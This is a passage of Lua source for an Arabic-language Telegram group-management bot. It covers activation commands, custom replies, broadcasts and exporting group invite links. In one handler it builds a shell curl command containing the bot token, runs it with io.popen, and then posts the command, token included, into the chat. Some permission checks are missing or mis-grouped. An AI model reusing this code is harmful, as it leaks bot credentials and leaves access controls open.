local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
DevAbs:set(loolIQ.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "@loolIQ")) 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🧩 ⌯ ٱڵـمجموعة : ( ["..title_name(chattid).."]("..(t2.invite_link_ or "t.me/loolIQ")..") )\n❗️🧬 ⌯ ٱلٱيـدي : ( *"..msg.chat_id_.."* )\n❗️🚸 ⌯ ٱڵـمنشئ : ( ["..monsh.."] )\n❗️🦠 ⌯ عدد ٱلٱعضٱء : ( *"..data.member_count_.."* )\n❗️⚜️ ⌯ عدد ٱڵـمـدرٱء : ( *"..Owner.."* )\n❗️🔑 ⌯ عدد ٱڵـمنشئين : ( *"..Monsh.."* )\n❗️🔱 ⌯ عدد ٱلٱدمنية : ( *"..Momod.."* )\n❗️💎 ⌯ عدد ٱڵـمميزين : ( *"..Vip.."* )\n❗️⚠️ ⌯ عدد ٱڵـمحظورين : ( *"..Baned.."* )\n❗️🔆 ⌯ عدد ٱڵـمقيدين : ( *"..Tkeed.."* )\n❗️🔕 ⌯ عدد ٱڵـمكتومين : ( *"..Muted.."* )\n\n", 1,"md")
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(chattid).ID
}, loolIQ3, nil)
end
openChat(msg.chat_id_,ABS_PROX) 
end
getChannelFull(chattid, abs_c9, nil)
end 
end
--     Source loolIQ     --
if text:match("^غادر (-%d+)$")  then
if not DevAbs:get(loolIQ..'lock:add'..msg.chat_id_) then
local txt = { string.match(text, "^(غادر) (-%d+)$")}
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمطورين فقط ', 1, 'md')
else 
local leavegp = function(extra, result)
if result.id_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱڵـمجموعة ( " .. result.title_ .. " )\n❗️⚠️ ⌯ تمت ٱڵمغٱدرة منهٱ بٱمر ٱڵمطور ", 1, "md")
if DevAbs:get(loolIQ.."lang:gp:" .. result.id_) then
local text = [[
❗️⚠️ ⌯ بٱمر ٱڵمطور تم مغٱدرة هذه ٱڵـمجموعة 
〰️➖〰️➖〰️➖〰️➖〰️ 
- ٱڵـمطور -  ]]..SUDOUSERNAME..[[  
]]
Dev_Abs(result.id_, 0, 1, text, 1, "md") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱڵـمجموعة ( " .. result.title_ .. " )\n❗️⚠️ ⌯ تمت ٱڵمغٱدرة منهٱ بٱمر ٱڵمطور ", 1, "md")
end 
chat_leave(result.id_, bot_id)
DevAbs:srem(loolIQ.."bot:groups", result.id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ڵم تتم ٱضٱفتي فيهٱ لٱقوم بمغٱدرتهٱ ", 1, "md")
end  end
getChat(txt[2], leavegp) 
end end end 
--     Source loolIQ     --
if text == 'تفعيل البوت الخدمي' then 
local  ABS_PROX = '❗️☻ تـۖم تـفعيـۧڵ ٱڵـبوت ٱڵخدمي ' 
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
DevAbs:del(loolIQ..'lock:bot:free'..bot_id) 
end 
if text == 'تعطيل البوت الخدمي' then 
ABS_PROX = '❗️☻ تـۖم تـعطيـۧڵ ٱڵـبوت ٱڵخدمي '
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
DevAbs:set(loolIQ..'lock:bot:free'..bot_id,true) 
end
if text == 'تفعيل التنبيه' then 
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمطورين فقط ', 1, 'md')
else 
local  ABS_PROX = '❗️☻ تـۖم تـفعيـۧڵ ٱڵـتنبيه على تغيـير \n ⌯ ( صوره • اسم • معرف ) ⌯ : ڵلٱعضٱء \n❗️🚸 فـي جميع مجموعٱت ٱڵـبوت ' 
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
DevAbs:del(loolIQ..'lock:bot:ttt'..bot_id) 
end 
end
if text == 'تعطيل التنبيه' then 
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمطورين فقط ', 1, 'md')
else 
ABS_PROX = '❗️☻ تـۖم تـعطيـۧڵ ٱڵـتنبيه على تغيـير \n ⌯ ( صوره • اسم • معرف ) ⌯ : ڵلٱعضٱء\n❗️🚸 فـي جميع مجموعٱت ٱڵـبوت '
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
DevAbs:set(loolIQ..'lock:bot:ttt'..bot_id,true) 
end
end
if text and text == "تفعيل تنبيه التغيرات" then
if DevAbs:get(loolIQ..'lock:bot:ttt'..bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـتنبيه على تغيـير\n ⌯ ( صوره • اسم • معرف ) ⌯ : ڵلٱعضٱء\n❗️🚸 معطـۧڵ فـي جميع مجموعٱت ٱڵـبوت مـن قِبـل ٱڵـمطور ', 1, 'md')
return false 
end
if not is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمشرفين فقط ', 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـفعيـۧڵ ٱڵـتنبيه على تغيـير \n ⌯ ( صوره • اسم • معرف ) ⌯ : ڵلٱعضٱء \n❗️🚸 فـي هذه ٱڵـمجموعة ', 1, 'md')
DevAbs:del(loolIQ.."lock:bot:ttt2:"..msg.chat_id_)
end
end
if text and text == "تعطيل تنبيه التغيرات" then 
if not is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمشرفين فقط ', 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـعطيـۧڵ ٱڵـتنبيه على تغيـير \n ⌯ ( صوره • اسم • معرف ) ⌯ : ڵلٱعضٱء \n❗️🚸 فـي هذه ٱڵـمجموعة ', 1, 'md')
DevAbs:set(loolIQ.."lock:bot:ttt2:"..msg.chat_id_,"ok")
end
end
if text == 'تفعيل الالعاب' then   
ABS_PROX = '❗️☻ تـۖم تـفعيـۧڵ ٱلٱڵعٱب فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟' 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:set(loolIQ..'bot:lock_geam'..msg.chat_id_,true)  
end
if text == 'تعطيل الالعاب' then  
ABS_PROX = '❗️☻ تـۖم تـعطيـۧڵ ٱلٱڵعٱب فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟' 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:del(loolIQ..'bot:lock_geam'..msg.chat_id_) 
end
if text == 'تفعيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) then   
if DevAbs:get(loolIQ..'lock:get:photo'..msg.chat_id_) then
ABS_PROX = '❗️☻ تـۖم تـفعيـۧڵ جڵب ٱڵصورة ٱڵشخصية \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟' 
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
DevAbs:del(loolIQ..'lock:get:photo'..msg.chat_id_) 
else
ABS_PROX = '❗️☻ جڵب ٱڵصورة ٱڵشخصية بٱڵتاكيد مۧفعڵـة ' 
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
end
end
if text == 'تعطيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) then   
if not DevAbs:get(loolIQ..'lock:get:photo'..msg.chat_id_) then
ABS_PROX = '❗️☻ تـۖم تـعطيـۧڵ جڵب ٱڵصورة ٱڵشخصية \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟'  
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
DevAbs:set(loolIQ..'lock:get:photo'..msg.chat_id_,true) 
else
ABS_PROX = '❗️☻ جڵب ٱڵصورة ٱڵشخصية بٱڵتاكيد مۧعطڵـة '  
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
end
end
if text and text == "تفعيل الرابط" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـفعيـۧڵ رٱبـط ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
DevAbs:del(loolIQ.."bot:tt:link:"..msg.chat_id_)
end
if text and text == "تعطيل الرابط" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـعطيـۧڵ رٱبـط ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
DevAbs:set(loolIQ.."bot:tt:link:"..msg.chat_id_,"ok")
end
if text:match('^تفعيل$') then
function adding(extra,result,success)
local txt = {string.match(text, "^(تفعيل)$")}
local function promote_admin(extra, result, success)
local admins = result.members_
for i=0 , #admins do
DevAbs:sadd(loolIQ..'abs:admins'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
DevAbs:sadd(loolIQ.."abs:monsh:"..msg.chat_id_,owner_id)
end
end
end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if DevAbs:get(loolIQ.."bot:enable:"..msg.chat_id_) then
if not DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵمجـمۄعة ،بٱڵتاكيد ،مۧفعڵـة', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ The group is definitely activated', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ The bot was activated in a group', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـفعيـۧڵ ٱڵبـۄت فيۧ ٱڵمجـمۄعة\n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
openChat(msg.chat_id_,ABS_PROX)
DevAbs:sadd("ABS_PROX:addg"..bot_id, msg.chat_id_)
function ABS_PROX(f1,f2)
function loolIQ3(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
DevAbs:set(loolIQ.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
Dev_Abs(tostring((DevAbs:get(loolIQ.."bot:leader:gr") or bot_owner)), 0, 1, "⛑ • تم تفعيل مجموعه جديده • \n〰️➖〰️➖〰️➖〰️➖〰️\n📮 • ايدي الضافني :  ("..msg.sender_user_id_..")\n🧯 • معرف الضافني : @"..(result.username_ or "لا يوجد").."\n〰️➖〰️➖〰️➖〰️➖〰️\n🎒 • معلومات المجموعه • \n〰️➖〰️➖〰️➖〰️➖〰️\n🦠 • ايدي المجموعه : ("..msg.chat_id_..")\n🧬 • اسم المجموعه : ("..f2.title_..")\n🧩 • رابط المجموعه : \n📍 • ("..(t2.invite_link_ or "Error")..") •" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, loolIQ3, nil)
end
openChat(msg.chat_id_,ABS_PROX) 
DevAbs:set(loolIQ.."bot:enable:"..msg.chat_id_,true)
DevAbs:setex(loolIQ.."bot:charge:"..msg.chat_id_,86400,true)
DevAbs:sadd("ABS_PROX:addg"..bot_id, msg.chat_id_)
local send_to_bot_owner = function(extra, result)
local v = tonumber(bot_owner)             
end
end
end
getUser(msg.sender_user_id_,adding)
end
---
if text:match('^تعطيل$') and is_sudo3(msg.sender_user_id_, msg.chat_id_) then
local txt = {string.match(text, "^(تعطيل)$")}
if not DevAbs:get(loolIQ.."bot:enable:"..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Group Actually Rem ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵمجـمۄعة ،بٱڵتاكيد ،مۧعطڵـة', 1, 'md')
end
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Group has been Rem ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـعطيـۧڵ ٱڵبـۄت فيۧ ٱڵمجـمۄعة\n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
end
DevAbs:del(loolIQ.."bot:charge:"..msg.chat_id_)
DevAbs:del(loolIQ.."bot:enable:"..msg.chat_id_)
DevAbs:srem("ABS_PROX:addg"..bot_id, msg.chat_id_)
local v = tonumber(bot_owner)          
end
end
if text:match('^[Rr]em(-%d+)$') and is_sudo3(msg.sender_user_id_, msg.chat_id_) then
local gp = {string.match(text, "^([Rr]em)(-%d+)$")}
DevAbs:del(loolIQ.."bot:charge:"..gp[2])
local v = tonumber(bot_owner)       
end
if text:match("^تفعيل كل الكروبات$") then
local gps = DevAbs:smembers(loolIQ.."bot:groups") or 0
local gps2 = DevAbs:smembers("ABS_PROX:addg"..bot_id) or 0
for i=1,#gps do
DevAbs:sadd("ABS_PROX:addg"..bot_id, gps[i])
DevAbs:set(loolIQ.."bot:enable:"..gps[i],true)
DevAbs:set( loolIQ.."bot:charge:"..gps[i],true)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـفعيـۧڵ ٱڵبـۄت فيۧ جميع ٱڵمجـمۄعٱت \n❗️🚸 ⌯ عدد المجموعات ⌯» ◝ '..(#gps - #gps2)..' ◟', 1, 'md')
end   
if text:match("^تعطيل كل الكروبات$") then
local gps = DevAbs:smembers(loolIQ.."bot:groups") or 0
local gps2 = DevAbs:smembers("ABS_PROX:addg"..bot_id) or 0
for i=1,#gps do
DevAbs:del("ABS_PROX:addg"..bot_id, gps[i])
DevAbs:del(loolIQ.."bot:enable:"..gps[i],true)
DevAbs:del( loolIQ.."bot:charge:"..gps[i],true)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـعطيـۧڵ ٱڵبـۄت فيۧ جميع ٱڵمجـمۄعٱت \n❗️🚸 ⌯ عدد المجموعات ⌯» ◝ '..(#gps - #gps2)..' ◟', 1, 'md')
end   

if text:match("^الدعم$") or text:match("^المطور$") then
function adding(extra,result,success)
function ABS_PROX(f1,f2)
function loolIQ3(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
DevAbs:set(loolIQ.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
Dev_Abs(tostring((DevAbs:get(loolIQ.."bot:leader:gr") or bot_owner)), 0, 1, "⛑ • هناك من بحاجه الى مساعده • \n〰️➖〰️➖〰️➖〰️➖〰️\n📮 • ايدي الشخص :  ("..msg.sender_user_id_..")\n🧯 • معرف الشخص : @"..(result.username_ or "لا يوجد").."\n〰️➖〰️➖〰️➖〰️➖〰️\n🎒 • معلومات المجموعه • \n〰️➖〰️➖〰️➖〰️➖〰️\n🦠 • ايدي المجموعه : ("..msg.chat_id_..")\n🧬 • اسم المجموعه : ("..f2.title_..")\n🧩 • رابط المجموعه : \n📍 • ("..(t2.invite_link_ or "Error")..") •" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, loolIQ3, nil)
end
openChat(msg.chat_id_,ABS_PROX) 
end
getUser(msg.sender_user_id_,adding)
end
--     Source loolIQ     --
if text == 'نسخه ملف السورس' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
if not DevAbs:get(loolIQ..'lock:add'..msg.chat_id_) then
sendDocument(bot_owner, 0, 0, 1, nil, './loolIQ.lua', dl_cb, nil)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 عـزيـزي ٱڵـمطور تم ٱرسـۧال نسـۧخة ملف ٱڵـسـۧورس ٱڵـى ٱڵـخاص ', 1, 'md')
end end end
--     Source loolIQ     --
if text == 'روابط الكروبات' or text == 'روابط المجموعات' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
local groups = function(extra, result) 
local num = (DevAbs:scard(loolIQ.."bot:groups"))
local list = DevAbs:smembers(loolIQ.."bot:groups")
local text = "(Source loolIQ - سورس ديف بروكس)\nΞ - File bot groups -\nΞ - ملف مجموعات البوت -\n〰️➖〰️➖〰️➖〰️➖〰️\n"
for k,v in pairs(list) do
local GroupsMonsh = DevAbs:scard(loolIQ.."abs:monsh:"..v) or 0
local GroupsOwner = DevAbs:scard(loolIQ.."abs:owners:"..v) or 0
local GroupsMod = DevAbs:scard(loolIQ.."abs:admins"..v) or 0
local Groupslink = DevAbs:get(loolIQ.."bot:group:link" ..v)
if result.first_name_ then
if #result.first_name_ < 35 then
else
for DevAbs222 in string.gmatch(result.first_name_, "[^%s]+") do
result.first_name_ = DevAbs222
break
end end end
text = text..k.." ⌯» ⤈ \n❗️🚸 Group ID  : [ "..v.." ]\n❗️🔑 Group Link : [ "..(Groupslink or "Not Found").." ]\n❗️🎗 Group Monsh  : [ "..GroupsMonsh.." ]\n❗️⚜️ Group Owners  : [ "..GroupsOwner.." ]\n❗️🔅 Group Admins : [ "..GroupsMod.." ] \n〰️➖〰️➖〰️➖〰️➖〰️\n"
end
local file = io.open('GroupsBot.txt', 'w')
file:write(text)
file:close()
local abbss = 'https://api.telegram.org/bot' .. tokenbot .. '/sendDocument'
local abbsss = 'curl "' .. abbss .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'GroupsBot.txt' .. '"'
io.popen(abbsss)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ عـزيـزي  *( '..result.first_name_..' )*\n❗️🔑 ⌯ جٱري ٱرسٱڵ نسخة ڵڵمجمۄعٱت \n❗️🎗 ⌯ تحتوي عڵى *( '..num..' )* مجمۄعة \n ', 1, 'md')
sleep(1.5)
Dev_Abs(msg.chat_id_, msg.id_, 1, abbsss, 1, 'md')
end
getUser(msg.sender_user_id_, groups)
end
end
--     Source loolIQ     --
if text and text:match("^نشر بالخاص (.*)") or text:match("^الاذاعه بالخاص (.*)") and is_leader(msg) then
if not DevAbs:get(loolIQ..'lock:add'..msg.chat_id_) then
local pm =  text:match("^نشر بالخاص (.*)") or text:match("^الاذاعه بالخاص (.*)")
local s2a = "❗️🚸 ⌯ تـۖم ٱذٱعـة رسـٱڵتك \n❗️🔑 ⌯ ٱڵـى ( * GP * ) ٱشخٱص \n‏❗️🎗 ⌯ فـي خـٱص ٱڵـبـوت \n "
local gp = tonumber(DevAbs:scard(loolIQ.."bot:userss"))
gps = DevAbs:smembers(loolIQ.."bot:userss")
text = s2a:gsub('GP',gp)
for k,v in pairs(gps) do
Dev_Abs(v, 0, 1,pm, 1, 'md')
end
Dev_Abs(msg.chat_id_, msg.id_, 1,text, 1, 'md')
end 
end
--     Source loolIQ     --
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد' and  is_owner(msg.sender_user_id_, msg.chat_id_) then
DevAbs:set(loolIQ..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','del_repgp1')
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ حسنٱ ٱرسـڵ ٱڵكلمة ڵحذفهٱ " ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = DevAbs:get(loolIQ..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'del_repgp1' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'❗️🚸 ⌯ ٱڵكلمة *('..msg.content_.text_..')*\n❗️⚠️ ⌯ تـۖم حـذفهٱ ',  1, "md")
DevAbs:del(loolIQ..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(loolIQ..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(loolIQ..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(loolIQ..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(loolIQ..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(loolIQ..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevAbs:del(loolIQ..'rep_owner'..msg.content_.text_..''..msg.chat_id_..'')
return false
end
end
--     Source loolIQ     --
if msg.content_.text_ == 'اضف رد' and is_owner(msg.sender_user_id_, msg.chat_id_)  then
DevAbs:set(loolIQ..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','set_repgp')
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ حسنٱ ٱرسـڵ ٱڵكلمة ٱلٱن " ,  1, "md")
return false    end
if msg.content_.text_ then
local content_DevAbs2 = DevAbs:get(loolIQ..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_DevAbs2 == 'set_repgp' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱرسـڵ ٱڵـرد \n❗️🔑 ⌯ يمكنك أضآفة : \n⌯ ( نص • بصمه • متحركه • ملصق ) ⌯ " ,  1, "md")
DevAbs:set(loolIQ..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'','save_repgp')
DevAbs:set(loolIQ..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'',msg.content_.text_)
DevAbs:sadd(loolIQ..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
 text = msg.content_.text_
if msg.content_.text_ == 'حذف رد عام' then
DevAbs:set(loolIQ.."add:repallt"..msg.sender_user_id_,'del_rep1')
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ حسنٱ ٱرسـڵ ٱڵكلمة ڵحذفهٱ " ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = DevAbs:get(loolIQ.."add:repallt"..msg.sender_user_id_)
if content_text == 'del_rep1' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'❗️🚸 ⌯ ٱڵكلمة *('..msg.content_.text_..')*\n❗️⚠️ ⌯ تـۖم حـذفهٱ ',  1, "md")
DevAbs:del(loolIQ.."add:repallt"..msg.sender_user_id_)
DevAbs:del(loolIQ.."gif_repall"..msg.content_.text_)
DevAbs:del(loolIQ.."voice_repall"..msg.content_.text_)
DevAbs:del(loolIQ.."stecker_repall"..msg.content_.text_)
DevAbs:del(loolIQ.."video_repall"..msg.content_.text_)
DevAbs:del(loolIQ.."text_repall"..msg.content_.text_)
DevAbs:del(loolIQ.."rep_sudo",msg.content_.text_)
return false
end
end
--     Source loolIQ     --
if msg.content_.text_ == 'اضف رد عام' and is_sudo(msg) then
DevAbs:set(loolIQ.."add:repallt"..msg.sender_user_id_,'set_rep')
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ حسنٱ ٱرسـڵ ٱڵكلمة ٱلٱن " ,  1, "md")
return false    end
if msg.content_.text_ then
local content_DevAbs2 = DevAbs:get(loolIQ.."add:repallt"..msg.sender_user_id_)
if content_DevAbs2 == 'set_rep' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱرسـڵ ٱڵـرد \n❗️🔑 ⌯ يمكنك أضآفة : \n⌯ ( نص • بصمه • متحركه • ملصق ) ⌯ " ,  1, "md")
DevAbs:set(loolIQ.."add:repallt"..msg.sender_user_id_,'save_rep')
DevAbs:set(loolIQ.."addreply2:"..msg.sender_user_id_, msg.content_.text_)
DevAbs:sadd(loolIQ.."rep_sudo",msg.content_.text_)
return false 
end    end
--     Source loolIQ     --
if  msg.content_.text_ == 'الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) then
local redod = DevAbs:smembers(loolIQ..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ لٱ تـوجـد رډوډ مضـٱفـة" ,  1, "md")
else
msg_rep = '❗️🎒 ⌯ رډوډ ٱڵمجموعة : \n〰️➖〰️➖〰️➖〰️➖〰️\n'
for k,v in pairs(redod) do
msg_rep = msg_rep ..k..' ⌯ *{ '..v..' }* \n' 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, msg_rep,1, 'md')
end
return false
end
--     Source loolIQ     --
if msg.content_.text_ == 'حذف الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) then
local redod = DevAbs:smembers(loolIQ..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ لٱ تـوجـد رډوډ مضـٱفـة" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbs:del(loolIQ..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(loolIQ..'gif_repgp'..v..msg.chat_id_)
DevAbs:del(loolIQ..'voice_repgp'..v..msg.chat_id_)
DevAbs:del(loolIQ..'stecker_repgp'..v..msg.chat_id_)
DevAbs:del(loolIQ..'video_repgp'..v..msg.chat_id_)
DevAbs:del(loolIQ..'text_repgp'..v..msg.chat_id_)
DevAbs:del(loolIQ..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حـذف جميع ٱڵرډوډ" ,  1, "md")
return false
end
end
--     Source loolIQ     --
if  msg.content_.text_ == "ردود المطور" or msg.content_.text_ == "الردود العام" or msg.content_.text_ == "ردود العام" and is_sudo(msg) then
local redod = DevAbs:smembers(loolIQ.."rep_sudo")
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ لٱ تـوجـد رډوډ مضـٱفـة" ,  1, "md")
else
local i = 1
msg_rep = '❗️🎒 ⌯ رډوډ ٱڵـمطور : \n〰️➖〰️➖〰️➖〰️➖〰️\n'
for k,v in pairs(redod) do
msg_rep = msg_rep ..k.." ⌯ *{ "..v.." }* \n"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, msg_rep,1, "md")
end
return false
end
--     Source loolIQ     --
if msg.content_.text_ == "حذف ردود المطور" or msg.content_.text_ == "حذف ردود العام" and is_sudo(msg) then
local redod = DevAbs:smembers(loolIQ.."rep_sudo")
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ لٱ تـوجـد رډوډ مضـٱفـة" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbs:del(loolIQ.."add:repallt"..v)
DevAbs:del(loolIQ.."gif_repall"..v)
DevAbs:del(loolIQ.."voice_repall"..v)
DevAbs:del(loolIQ.."stecker_repall"..v)
DevAbs:del(loolIQ.."video_repall"..v)
DevAbs:del(loolIQ.."text_repall"..v)
DevAbs:del(loolIQ.."rep_sudo",msg.content_.text_)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حـذف جميع رډوډ ٱڵـمطور" ,  1, "md")
return false
end
end 
--     Source loolIQ     --
if text:match("^تغيير اسم البوت$") or text:match("^وضع اسم البوت$") or text:match("^ضع اسم البوت$") then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱرسـڵ ٱسـم ٱڵـبۄت ٱلٱن ', 1, 'html')
DevAbs:set('ABS_PROX:'..bot_id..'namebot'..msg.sender_user_id_..'', 'msg')
return false 
end
end
if text and text == 'حذف اسم البوت' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
DevAbs:del('ABS_PROX:'..bot_id..'name_bot')
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم حـذف ٱسـم ٱڵـبۄت ', 1, 'html')
end end 
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match('^حذف (%d+)$') then
local matches = {string.match(text, "^(حذف) (%d+)$")}
if msg.chat_id_:match("^-100") then
if tonumber(matches[2]) > 100 or tonumber(matches[2]) < 1 then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
